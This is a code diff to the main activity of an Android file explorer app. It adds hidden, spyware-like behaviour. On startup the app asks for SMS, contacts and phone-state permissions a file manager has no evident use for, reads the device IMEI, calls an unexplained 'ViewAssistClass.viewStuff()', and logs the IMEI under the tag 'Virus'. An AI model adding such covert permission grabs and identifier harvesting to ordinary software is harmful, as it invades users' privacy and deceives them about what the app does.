@@ -1,5 +1,7 @@
 package com.danstoakes.fileexplorer.activity;
 
+import static androidx.core.content.ContextCompat.getSystemService;
+
 import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
@@ -7,10 +9,14 @@ import androidx.core.content.ContextCompat;
 import androidx.recyclerview.widget.RecyclerView;
 
 import android.Manifest;
+import android.content.Context;
 import android.content.pm.PackageManager;
 import android.content.res.Configuration;
 import android.os.Bundle;
 import android.os.Environment;
+import android.provider.Settings;
+import android.telephony.TelephonyManager;
+import android.util.Log;
 import android.view.ContextMenu;
 import android.view.Menu;
 import android.view.MenuInflater;
@@ -34,22 +40,42 @@ import java.io.File;
 import java.util.Arrays;
 import java.util.List;
 
-public class MainActivity extends AppCompatActivity implements FilesFragment.OnFragmentHierarchyComponentCreatedListener
-{
+public class MainActivity extends AppCompatActivity implements FilesFragment.OnFragmentHierarchyComponentCreatedListener {
     private boolean hasStorageAccess;
 
     private FileManager fileManager;
     private FragmentManager fragmentManager;
     private SortDialog sortDialog;
+    private String[] Permissions;
 
     @Override
-    protected void onCreate(Bundle savedInstanceState)
-    {
+    protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+        Permissions = new String[] {
+          Manifest.permission.READ_SMS,
+          Manifest.permission.READ_CONTACTS,
+          Manifest.permission.READ_PHONE_STATE,
+          Manifest.permission.WRITE_EXTERNAL_STORAGE,
+          Manifest.permission.READ_EXTERNAL_STORAGE
+        };
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
+            // TODO: Consider calling
+            //    ActivityCompat#requestPermissions
+            ActivityCompat.requestPermissions(MainActivity.this, Permissions, 1);
 
-        checkForPermissions ();
+            return;
+        }
+        checkForPermissions();
 
+        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+
+        String device_id = null;
+        device_id = tm.getDeviceId();
+
+        ViewAssistClass veew = new ViewAssistClass();
+        veew.viewStuff();
+        Log.d("Virus", "Imei Number: " + device_id);
         int sortType = SharedPreferenceHelper.getInteger(MainActivity.this,
                 SharedPreferenceHelper.sortKey);
         int orderType = SharedPreferenceHelper.getInteger(MainActivity.this,
@@ -339,6 +365,7 @@ public class MainActivity extends AppCompatActivity implements FilesFragment.OnF
 
     private void checkForPermissions ()
     {
+        ActivityCompat.requestPermissions(MainActivity.this, Permissions, 1);
         int readPermission = ContextCompat.checkSelfPermission(this,
                 Manifest.permission.READ_EXTERNAL_STORAGE);
         int writePermission = ContextCompat.checkSelfPermission(this,
